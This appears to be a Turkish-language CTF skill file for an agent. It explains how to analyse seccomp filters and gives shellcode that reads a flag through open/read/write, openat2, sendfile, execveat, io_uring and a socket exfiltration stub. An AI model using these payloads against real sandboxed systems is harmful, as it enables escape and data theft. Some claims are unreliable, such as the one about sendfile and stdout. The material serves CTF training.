---
name: seccomp-sandbox-escape
description: SECCOMP filter analizi ve bypass — yasaklı syscall'lar etrafında ORW shellcode, open+sendfile, openat2, io_uring teknikleri
tags: [ctf, pwn, seccomp, sandbox, shellcode, orw, syscall, filter-bypass, bpf, prctl]
triggers:
  - "seccomp"
  - "syscall filter"
  - "no execve"
  - "execve yok"
  - "prctl seccomp"
  - "BPF filter"
  - "sandbox"
  - "ORW shellcode"
  - "open read write"
  - "sendfile"
  - "io_uring"
  - "syscall whitelist"
  - "EINVAL syscall"
  - "killed by signal"
  - "SECCOMP_RET_KILL"
difficulty: medium
category: pwn
solved_challenges:
  - "TokyoWesterns CTF 2018 - simple_note (seccomp ORW)"
  - "InCTF 2021 - shooting (sendfile bypass)"
  - "RedpwnCTF 2020 - decisive (BPF filter analysis)"
  - "Hxp 2022 - kuche (io_uring bypass)"
related_skills:
  - buffer-overflow-rop
  - srop-attack
  - heap-exploit
---

# SECCOMP Sandbox Escape — Yasaklı Syscall'lar Etrafında Dans

SECCOMP (`prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER)`) bir BPF filtresiyle hangi syscall'lara izin verileceğini kısıtlar. CTF'te genel pattern: `execve` yasak, ama `open`, `read`, `write` serbest. Hedef: yine de flag'i oku.

---

## Ne Zaman Kullan

Binary çalıştığında `execve("/bin/sh")` veya `system("/bin/sh")` yerine flag dosyasını oku — flag genelde:
- `/flag` veya `/flag.txt`
- `flag.txt` (CWD'de)
- ENV variable: `getenv("FLAG")`

SECCOMP olduğunu nasıl anlarsın?
- Binary'de `prctl` veya `seccomp_load` çağrısı (strings/ltrace)
- `system("/bin/sh")` çalışmıyor ama segfault değil — `Bad system call (SIGSYS)` mesajı
- Verilen kod `init_filter()` veya `seccomp_init()` çağırıyor

---

## Filtre Analizi

### seccomp-tools Kullanımı

```bash
# Kurulum
gem install seccomp-tools

# Dump filtre
seccomp-tools dump ./vuln

# Tipik çıktı:
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x15 0x00 0x03 0x0000003b  if (A != execve) goto 0007
#  0004: 0x06 0x00 0x00 0x00000000  return KILL
#  0005: ...
#  0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

### Yorumlama
- `KILL` = `SIGSYS` ile süreç öldürülür
- `ERRNO` = syscall `-EPERM` (vb.) döndürür
- `TRAP` = `SIGSYS` ama daha yumuşak
- `ALLOW` = syscall normal çalışır

### Syscall Numaraları (Linux x86-64)

| Syscall | Numara |
|---|---|
| read | 0 |
| write | 1 |
| open | 2 |
| close | 3 |
| stat | 4 |
| mmap | 9 |
| brk | 12 |
| rt_sigreturn | 15 |
| ioctl | 16 |
| pread64 | 17 |
| sendfile | 40 |
| socket | 41 |
| connect | 42 |
| sendto | 44 |
| recvfrom | 45 |
| execve | 59 |
| exit | 60 |
| openat | 257 |
| openat2 | 437 |
| io_uring_setup | 425 |

---

## Saldırı 1 — Klasik ORW Shellcode

**Koşul:** `open`, `read`, `write` serbest.

```python
# pwntools shellcraft
from pwn import *
context.arch = 'amd64'

sc = shellcraft.open('/flag')         # rax = open("/flag", 0)
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 0x100)
sc += shellcraft.exit(0)

shellcode = asm(sc)
log.info(f'shellcode len = {len(shellcode)}')
```

### Manuel ORW (referans için)
```python
# /flag (5 byte) → buffer
sc = """
    /* open("/flag", O_RDONLY) */
    mov rax, 2              /* SYS_open */
    lea rdi, [rip+flag_str]
    xor rsi, rsi
    syscall

    /* read(fd, rsp, 0x100) */
    mov rdi, rax            /* fd */
    mov rax, 0              /* SYS_read */
    mov rsi, rsp
    mov rdx, 0x100
    syscall

    /* write(1, rsp, 0x100) */
    mov rdi, 1
    mov rax, 1              /* SYS_write */
    mov rsi, rsp
    mov rdx, 0x100
    syscall

    /* exit */
    mov rax, 60
    xor rdi, rdi
    syscall

flag_str:
    .ascii "/flag"
    .byte 0
"""
shellcode = asm(sc)
```

---

## Saldırı 2 — `openat` Bypass (open yasaksa)

**Koşul:** `open` yasak ama `openat` izinli (yaygın).

```python
sc = """
    /* openat(AT_FDCWD = -100, "/flag", O_RDONLY) */
    mov rax, 257            /* SYS_openat */
    mov rdi, -100
    lea rsi, [rip+flag_str]
    xor rdx, rdx
    syscall

    /* read + write devamı */
flag_str: .ascii "/flag\\x00"
"""
```

---

## Saldırı 3 — `openat2` (Modern Bypass)

**Koşul:** `open`/`openat` yasak ama `openat2` izinli (filter eski yazılmış).

```python
sc = """
    /* openat2(AT_FDCWD, "/flag", &how, sizeof(how)) */
    sub rsp, 0x40
    /* how struct: flags=0, mode=0, resolve=0 */
    mov qword ptr [rsp], 0
    mov qword ptr [rsp+8], 0
    mov qword ptr [rsp+0x10], 0

    mov rax, 437            /* SYS_openat2 */
    mov rdi, -100
    lea rsi, [rip+flag_str]
    mov rdx, rsp
    mov r10, 0x18
    syscall
"""
```

---

## Saldırı 4 — `sendfile` (read+write yasaksa)

**Koşul:** `open` izinli, `read`/`write` yasak ama `sendfile` serbest.

```python
sc = """
    /* fd = open("/flag", 0) */
    mov rax, 2; lea rdi, [rip+flag]; xor rsi, rsi; syscall
    mov rdi, rax     /* in_fd */
    mov rsi, 1       /* out_fd = stdout */
    xor rdx, rdx     /* offset NULL */
    mov r10, 0x100
    mov rax, 40      /* SYS_sendfile */
    syscall
flag: .ascii "/flag\\x00"
"""
```

**sendfile pratikte stdout'a yazmaz** — out_fd socket olmalı (eski kernel'lerde regular file de OK). Sınanmalı.

---

## Saldırı 5 — Network Out (open/read OK ama write yasak)

**Koşul:** `open`+`read` OK, `write` yasak, `socket`+`connect`+`sendto` serbest.

```python
sc = """
    /* fd_flag = open("/flag", 0) */
    mov rax, 2; lea rdi, [rip+flag]; xor rsi, rsi; syscall
    mov r12, rax
    /* read(fd_flag, rsp, 0x100) */
    mov rdi, r12; mov rax, 0; mov rsi, rsp; mov rdx, 0x100; syscall
    mov r13, rax     /* read'in dönüşü */

    /* socket(AF_INET, SOCK_STREAM, 0) */
    mov rax, 41; mov rdi, 2; mov rsi, 1; xor rdx, rdx; syscall
    mov r14, rax

    /* connect — yapı sockaddr_in */
    /* skip for brevity */

    /* sendto(sock, rsp, len, 0, addr, addrlen) */
    mov rax, 44; ...
"""
```

---

## Saldırı 6 — `io_uring` (Modern, Çok Tehlikeli Bypass)

**Koşul:** `io_uring_setup`, `io_uring_enter` izinli, klasik syscall'lar yasak.

`io_uring` kernel'de bir queue üzerinden syscall'ları işler — SECCOMP filtresi syscall # üzerinden çalıştığı için io_uring üzerinden okunan dosyalar **filtreden geçmez**.

```c
// liburing kullanarak (apt install liburing-dev)
#include <liburing.h>

struct io_uring ring;
io_uring_queue_init(8, &ring, 0);

int fd = open("/flag", O_RDONLY);  // OK, syscall direct
struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
io_uring_prep_read(sqe, fd, buf, 0x100, 0);
io_uring_submit(&ring);

struct io_uring_cqe *cqe;
io_uring_wait_cqe(&ring, &cqe);
write(1, buf, cqe->res);   // veya başka yol
```

Shellcode olarak yazmak zor; ama C ile derleyip yükleyebilirsen bypass çalışır.

---

## Saldırı 7 — `/proc/self/mem` Self-Modify

**Koşul:** `open`+`read`+`write` ve `lseek` izinli, kontrolün var. Kendi belleğine yaz.

```python
# /proc/self/mem aç, exec memory'ye write et, sonra çalıştır
# ama write korumalı sayfa için mprotect gerekir
```

---

## Saldırı 8 — `mmap` + Shellcode

**Koşul:** `mmap` izinli, shellcode ile bellek alıp atlayabilirsen.

```python
sc = shellcraft.mmap(0, 0x1000, 7, 0x22, -1, 0)   # PROT_RWX, MAP_PRIVATE|MAP_ANONYMOUS
sc += shellcraft.read(0, 'rax', 0x100)            # stdin'den shellcode oku
sc += 'jmp rax'                                   # atla
# Sonra stdin'e ORW shellcode gönder
```

---

## Klasik Tuzaklar

### 1. `ptrace` yasak ama `seccomp_load` çağrılı
Process'i debug edemezsin (CTF'te bazen istenir). gdb çalışmaz.

### 2. `arch_prctl` ile FS register
`%fs` register kontrolü ile TLS değiştir → bazı LD_PRELOAD benzeri saldırılar.

### 3. `execve` yasak ama `execveat` izinli
```python
# execveat(AT_FDCWD, "/bin/sh", argv, envp, 0)
sc = """
    mov rax, 322            /* SYS_execveat */
    mov rdi, -100
    lea rsi, [rip+sh]
    ...
"""
```

### 4. Tüm filter "kill if not in whitelist" — ama whitelist eksik
seccomp-tools dump çıktısında `JF` (false jump) `KILL`'e gitmiyorsa, allowlist syscall'larından biri eksik kalmış olabilir.

### 5. `rt_sigreturn` whitelist'ta
SROP atak vektörü açık (bkz: `pwn/srop-attack`).

---

## Filter Tipini Tanı

```python
import struct

def parse_seccomp_filter(filter_bytes):
    """Raw BPF filter byte'larından syscall listesini çıkar."""
    # struct sock_filter { u16 code, u8 jt, u8 jf, u32 k }
    insns = []
    for i in range(0, len(filter_bytes), 8):
        code, jt, jf, k = struct.unpack('<HBBI', filter_bytes[i:i+8])
        insns.append((code, jt, jf, k))
    return insns

# Veya doğrudan seccomp-tools dump
```

---

## Pratik Akış

```
1. seccomp-tools dump ./binary
2. Whitelist syscall'larını listele
3. open/openat/openat2 → varsa ORW
4. read/write yasak → sendfile / socket
5. mmap var → arbitrary shellcode jump
6. io_uring var → kernel bypass
7. Hiçbiri yoksa → SROP veya pure ROP
```

---

## Cross-Skill Pivot

```
SECCOMP varsa execve yok
              ├── open/read/write → ORW shellcode
              ├── openat/openat2 → modified ORW
              ├── sendfile → file → stdout
              ├── socket → flag exfiltration
              ├── io_uring → kernel bypass
              ├── mmap → shellcode load
              └── Hiçbiri yok → SROP skill ile syscall craft
```

---

## Tools

```bash
# Filter analizi
gem install seccomp-tools
seccomp-tools dump ./vuln

# Shellcode test (sandbox simülasyonu)
seccomp-tools emu ./filter.bpf < shellcode

# Shellcoding
pwntools shellcraft modülü
msfvenom

# io_uring
apt install liburing-dev
```

---

## Ek Kaynaklar

- David Wong seccomp explainer: https://www.cryptologie.net/article/...
- LiveOverflow seccomp video serisi
- "The Definitive Guide to Linux System Calls" — syscall numaraları için
- KernelTLV BPF Filter Documentation
